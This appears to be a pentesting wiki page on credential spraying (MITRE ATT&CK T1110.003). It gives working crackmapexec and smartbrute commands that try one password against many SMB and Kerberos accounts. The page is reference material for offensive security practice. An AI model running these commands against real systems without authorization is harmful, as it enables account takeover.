---
description: MITRE ATT&CK™ Sub-technique T1110.003
---

# Spraying

Credential spraying is a technique that attackers use to try a few passwords (or keys) against a set of usernames instead of a single one. This technique is just [credential guessing](guessing.md) but "sprayed" (i.e. against multiple accounts) and tools that can do [credential guessing](guessing.md) can usually do spraying.

```bash
# crackmapexec example
cme smb target_ip -d domain.local -u users.txt -p "password" --no-bruteforce --continue-on-succes

# smartbrute example (dynamic user list)
smartbrute smart -bp "password" kerberos -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kdc-ip "$KDC" kerberos

# smartbrute example (static users list)
smartbrute brute -bU users.txt -bp "password" kerberos --kdc-ip "$KDC" 
```

{% content-ref url="guessing.md" %}
[guessing.md](guessing.md)
{% endcontent-ref %}



